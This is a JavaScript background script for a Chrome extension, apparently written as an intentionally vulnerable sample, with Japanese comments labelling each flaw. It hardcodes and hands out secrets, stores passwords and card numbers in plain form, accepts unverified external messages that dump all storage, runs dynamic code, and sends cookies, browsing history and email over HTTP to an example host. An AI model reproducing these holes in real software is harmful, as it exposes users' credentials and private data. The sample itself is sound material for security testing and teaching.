// Background Service Worker

// グローバル設定（ハードコーディングされたAPIキー - セキュリティ問題）
const API_KEY = 'hardcoded_api_key_1234567890abcdefghijklmnop';
const SECRET_TOKEN = 'Bearer hardcoded_jwt_token_example_do_not_use';

// メッセージリスナー（sender検証なし - セキュリティ問題）
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // sender の検証を行わない - 任意のページからメッセージを受け取る
  if (message.type === 'executeCode') {
    // eval() を削除して安全な実装に変更
    sendResponse({ success: false, error: 'Code execution is not allowed for security reasons' });
  }

  if (message.type === 'getApiKey') {
    // 機密情報をそのまま返す
    sendResponse({ apiKey: API_KEY, token: SECRET_TOKEN });
  }

  if (message.type === 'storeCredentials') {
    // 機密情報を暗号化せずにストレージに保存
    chrome.storage.sync.set({
      username: message.username,
      password: message.password,
      creditCard: message.creditCard
    });
    sendResponse({ success: true });
  }

  return true;
});

// 外部からのメッセージを受け入れる（externally_connectableが設定されていない場合でも問題）
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  // 外部ドメインの検証なし
  console.log('External message from:', sender.url);

  if (message.type === 'getData') {
    // 内部データを外部に公開
    chrome.storage.local.get(null, (data) => {
      sendResponse(data); // すべてのストレージデータを返す
    });
  }

  return true;
});

// 動的スクリプト実行（Function constructor - セキュリティ問題）
function executeDynamicCode(codeString) {
  const dynamicFunction = new Function(codeString);
  return dynamicFunction();
}

// 外部APIへのデータ送信（HTTPS未使用）
async function sendAnalytics(eventData) {
  const endpoint = 'http://analytics.example.com/track';

  // ユーザーの同意なしでデータを送信
  const payload = {
    userId: eventData.userId,
    email: eventData.email,
    browsing_history: await getBrowsingHistory(),
    cookies: await getAllCookies()
  };

  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': API_KEY // ヘッダーに機密情報
      },
      body: JSON.stringify(payload)
    });

    return await response.json();
  } catch (err) {
    // エラーログに機密情報を出力
    console.error('Analytics error:', err, 'API Key:', API_KEY);
  }
}

// ブラウジング履歴を取得（プライバシー侵害）
async function getBrowsingHistory() {
  return new Promise((resolve) => {
    chrome.history.search({
      text: '',
      maxResults: 1000,
      startTime: Date.now() - 30 * 24 * 60 * 60 * 1000 // 過去30日
    }, (results) => {
      resolve(results);
    });
  });
}

// すべてのCookieを取得（プライバシー侵害）
async function getAllCookies() {
  return new Promise((resolve) => {
    chrome.cookies.getAll({}, (cookies) => {
      resolve(cookies);
    });
  });
}

// WebRequestでトラフィックを傍受（プライバシー侵害）
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    // すべてのリクエストをログに記録
    console.log('Request intercepted:', details.url);

    // フォームデータを取得（パスワード等を含む可能性）
    if (details.requestBody) {
      console.log('Form data:', details.requestBody);
    }
  },
  { urls: ['<all_urls>'] },
  ['requestBody']
);

console.log('Background service worker loaded');
console.log('API Key:', API_KEY); // 機密情報のログ出力
